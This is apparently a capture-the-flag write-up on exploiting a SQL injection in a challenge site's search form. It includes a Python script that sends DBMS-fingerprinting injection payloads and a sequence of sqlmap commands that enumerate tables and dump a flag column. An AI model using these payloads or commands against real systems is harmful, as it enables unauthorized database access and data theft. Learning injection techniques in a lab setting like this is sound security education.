Identifying DBMS

Since I’m lazy, I tried using SQLmap directly, but unfortunately it didn’t work. To make it work, we need to optimize the syntax that we’ll use. We need:

  • the DBMS
  • the SQLi METHOD (error based, time based…)
  • the POST request file for SQLmap

To identify the DBMS I used payloads from PayloadsAllTheThings and analyzed the server responses. In our case, a 500 response indicates that the payload didn’t work, meaning the server wasn’t using the associated DBMS.

I’m still lazy, so I wrote a python script to automate the identification process:

#!/usr/bin/env python3

from requests import post
from pwn import log

# URL of the challenge
url = "http://34.135.223.176:1928/search"

# Use payloads from payload all the things
payloads = {
    "mysql": "connection_id()=connection_id()",
    "mssql": "BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)",
    "oracle:": "ROWNUM=ROWNUM",
    "pgsql": "pg_client_encoding()=pg_client_encoding()",
    "sqlite": "sqlite_version()=sqlite_version()",
    "msaccess": "val(cvar(1))=1",
}

# Loop through every payload
for key in payloads:
    log.info(f"Sending payload for {key} ...")

    st = post(url, data={
        "query": f"' OR {payloads[key]} OR '"
    }).status_code

    if(st == 500):
        log.failure("Got 500")
    else:
        log.info(f"Got {st} !!!")
        log.success(f"Backend is {key}")
        exit()

The backend is using SQLite !

Exploitation

SQLmap

Identifying SQLi Type

As we’ve seen earlier, the server returns a 500 when we put a '. This means the server doesn’t show database errors, so no error based SQLi. We can try boolean based and time based.

First, we need to create the post request file for SQLmap:

Now we can launch the attack with this file:

1

sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique BT

Leaking tables
1

sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B --tables

There’s one table named recipes

Leaking columns

Since it’s boolean time based SQLi, dumping the full table will take a long time. To optimize, we’ll extract only the column that we are interested in.

1

sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B -T recipes --columns

Several columns found.

Dumping table

Finally, we can dump the flag columns from recipes table:

1

sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B -T recipes -C flag --dump

Got it !
